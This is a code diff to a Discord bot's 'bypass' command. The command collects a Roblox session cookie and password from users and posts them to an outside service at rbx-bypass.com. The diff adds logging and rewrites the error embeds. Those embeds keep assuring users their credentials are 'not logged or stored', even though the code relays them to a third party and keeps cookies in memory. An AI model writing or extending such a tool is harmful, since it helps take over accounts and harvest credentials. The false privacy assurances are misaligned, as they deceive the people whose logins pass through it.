@@ -10,6 +10,7 @@ import {
 } from 'discord.js';
 import axios from 'axios';
 import { validateCookie } from '../roblox';
+import { logger } from '../../lib/logger';
 import type { Command } from './types';
 
 const bypassStore = new Map<string, string>();
@@ -35,7 +36,7 @@ async function fetchRobux(cookie: string, userId: string): Promise<number> {
       timeout: 10000,
     });
     if (resp.status === 200 && resp.data) return resp.data.robux || 0;
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchRobux bypass'); }
   return 0;
 }
 
@@ -58,7 +59,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
   try {
     await interaction.deferReply({ ephemeral: true });
 
-    const cookie = interaction.options.getString('cookie', true);
+    const rawCookie = interaction.options.getString('cookie', true);
     const password = interaction.options.getString('password', true);
     const timestamp = new Date().toLocaleString();
     const footerData = {
@@ -66,21 +67,19 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       iconURL: interaction.user.displayAvatarURL(),
     };
 
-    const validation = await validateCookie(cookie, 3);
+    const validation = await validateCookie(rawCookie, 3);
     if (!validation.valid) {
-      const isNetwork = validation.debug.includes('getaddrinfo') ||
-                        validation.debug.includes('ENOTFOUND') ||
-                        validation.debug.includes('ETIMEDOUT');
       const embed = new EmbedBuilder()
-        .setTitle(isNetwork ? '𖣐 Network Error .ᐟ' : '𖣐 Invalid Cookie .ᐟ')
+        .setTitle(validation.isNetworkError ? '𖣐 Failed!' : '𖣐 Invalid Cookie .ᐟ')
         .setColor('#FFFFFF')
         .setDescription(
-          isNetwork
-            ? '✧ **Failed to fetch API!**\n────\n⭑ Cookie was valid, but error fuck our code 🚬..\n⭑ Check your internet connection and try again.'
-            : `✧ **Error Occurred**\n────\n⭑ The provided cookie is not valid.\n⭑ Your credentials were not logged.`
+          validation.isNetworkError
+            ? '✧ **Failed!**\n────\n⭑ Unable to reach Roblox servers. Please try again later.'
+            : '✧ **Invalid Cookie**\n────\n⭑ The provided cookie is not valid.'
         )
         .setFooter(footerData);
       await interaction.editReply({ embeds: [embed] });
+      logger.error({ debug: validation.debug, userId: interaction.user.id }, 'Bypass validation failed');
       return;
     }
 
@@ -104,7 +103,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       'origin': 'https://rbx-bypass.com',
       'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
     };
-    const payload = { cookie, password };
+    const payload = { cookie: rawCookie, password };
 
     try {
       const resp = await axios.post(url, payload, { headers, timeout: 15000, validateStatus: () => true });
@@ -162,44 +161,46 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       } else {
         const reason = data.message || data.error || 'Unknown error';
         const embed = new EmbedBuilder()
-          .setTitle('𖣐 Failed .ᐟ')
+          .setTitle('𖣐 Failed!')
           .setColor('#FFFFFF')
           .setDescription(
             `✧ **Error Occurred**\n` +
             `────\n` +
-            `⭑ **Reason:** ${reason}\n` +
-            `⭑ The bypass request was rejected or failed.\n` +
+            `⭑ The bypass request was rejected.\n` +
             `⭑ Your credentials were not logged or stored.`
           )
           .setFooter(footerData);
         await interaction.editReply({ embeds: [embed] });
+        logger.error({ reason, userId: interaction.user.id }, 'Bypass API returned error');
       }
     } catch (error: any) {
       if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
         const embed = new EmbedBuilder()
-          .setTitle('𖣐 Timeout .ᐟ')
+          .setTitle('𖣐 Failed!')
           .setColor('#FFFFFF')
           .setDescription(
-            '✧ **Status:** Timeout Exceeded\n' +
+            '✧ **Timeout**\n' +
             `────\n` +
-            `⭑ The bypass request timed out.\n` +
-            `⭑ Please run the command again to check the status.\n` +
+            `⭑ The request timed out.\n` +
+            `⭑ Please try again later.\n` +
             `⭑ Your credentials were not logged or stored.`
           )
           .setFooter(footerData);
         await interaction.editReply({ embeds: [embed] });
+        logger.error({ err: error, userId: interaction.user.id }, 'Bypass timeout');
       } else {
         throw error;
       }
     }
   } catch (error: any) {
+    logger.error({ err: error, userId: interaction.user.id }, 'Bypass command error');
     const embed = new EmbedBuilder()
-      .setTitle('𖣐 Error .ᐟ')
+      .setTitle('𖣐 Failed!')
       .setColor('#FFFFFF')
       .setDescription(
-        `✧ **Unexpected Error**\n` +
+        '✧ **Unexpected Error**\n' +
         `────\n` +
-        `⭑ ${error.message || 'Something went wrong.'}\n` +
+        `⭑ Something went wrong. Please try again later.\n` +
         `⭑ Your credentials were not logged or stored.`
       )
       .setFooter({
@@ -228,7 +229,8 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
       await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
     }
   } catch (error: any) {
-    await interaction.reply({ content: `𖣐 Error: ${error.message || 'Something went wrong.'}`, ephemeral: true });
+    logger.error({ err: error }, 'Bypass button error');
+    await interaction.reply({ content: '𖣐 Failed!', ephemeral: true });
   }
 }
 
